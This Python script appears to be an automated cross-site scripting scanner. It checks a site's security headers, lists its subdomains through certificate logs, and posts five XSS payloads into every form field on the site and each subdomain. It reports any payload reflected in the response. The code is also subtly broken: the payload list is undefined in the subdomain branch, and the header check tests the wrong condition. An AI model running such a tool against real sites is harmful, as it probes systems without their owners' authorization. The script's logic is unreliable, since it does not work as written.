import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def check_protection_headers(url):
    try:
        response = requests.head(url, allow_redirects=True)
        print(f"\nHeaders for {url}:\n")

        # Check for common security headers
        security_headers = ["Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options", "X-XSS-Protection"]

        for header in security_headers:
            if header in response.headers:
                print(f"{header}: {response.headers[header]}")
            else:
                print(f"{header}: Not found")

        return response.headers

    except requests.RequestException as e:
        print(f"Error: {e}")
        return {}

def enumerate_subdomains(domain):
    try:
        crt_sh_url = f'https://crt.sh/?q=%.{domain}&output=json'
        response = requests.get(crt_sh_url)
        certificates = response.json()

        subdomains = set()

        for cert in certificates:
            subdomains.add(cert['name_value'].strip())

        return subdomains

    except requests.RequestException as e:
        print(f"Error enumerating subdomains: {e}")
        return set()

def find_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        return forms

    except requests.RequestException as e:
        print(f"Error: {e}")
        return []

def test_xss_payloads(url, form, payload_list):
    for payload in payload_list:
        try:
            form_data = {input_tag.get('name', ''): payload for input_tag in form.find_all(['input', 'textarea'])}
            response = requests.post(urljoin(url, form.get('action', '')), data=form_data)

            # Check if the payload is reflected in the response
            if payload in response.text:
                print(f"XSS Vulnerability Found!\nPayload: {payload}\nURL: {urljoin(url, form.get('action', ''))}\n")
            else:
                print(f"No XSS Vulnerability Found with Payload: {payload}")

        except requests.RequestException as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    user_input = input("Enter the URL (http/https): ").strip()

    if not user_input.startswith(("http://", "https://")):
        print("Invalid URL. Please enter a valid URL.")
        exit()

    url = user_input

    protection_headers = check_protection_headers(url)

    if not protection_headers:
        print("\nNo protection headers found. Proceeding to test XSS payloads...\n")

        forms = find_forms(url)

        if not forms:
            print("No forms found on the page.")
            exit()

        print(f"\nFound {len(forms)} form(s) on the page. Testing for XSS vulnerabilities...\n")

        xss_payloads = [
            '<script>alert("XSS1")</script>',
            '<img src="x" onerror="alert(\'XSS2\')" />',
            '"><script>alert("XSS3")</script>',
            '<svg/onload=alert("XSS4")>',
            '<iframe src="javascript:alert(\'XSS5\')"></iframe>'
        ]

        for form in forms:
            test_xss_payloads(url, form, xss_payloads)

    else:
        print("\nProtection headers found. Enumerating subdomains and continuing...\n")

        # Extract the domain from the URL
        domain = urlparse(url).hostname

        # Enumerate subdomains using crt.sh
        subdomains = enumerate_subdomains(domain)

        print(f"\nEnumerated {len(subdomains)} subdomains:\n")
        for subdomain in subdomains:
            print(subdomain)

        print("\nContinuing with XSS testing on subdomains...\n")

        # Iterate through subdomains and perform XSS testing
        for subdomain in subdomains:
            subdomain_url = f"http://{subdomain}"

            print(f"\nTesting XSS on subdomain: {subdomain_url}\n")

            forms = find_forms(subdomain_url)

            if not forms:
                print("No forms found on the subdomain.")
                continue

            print(f"\nFound {len(forms)} form(s) on the subdomain. Testing for XSS vulnerabilities...\n")

            for form in forms:
                test_xss_payloads(subdomain_url, form, xss_payloads)
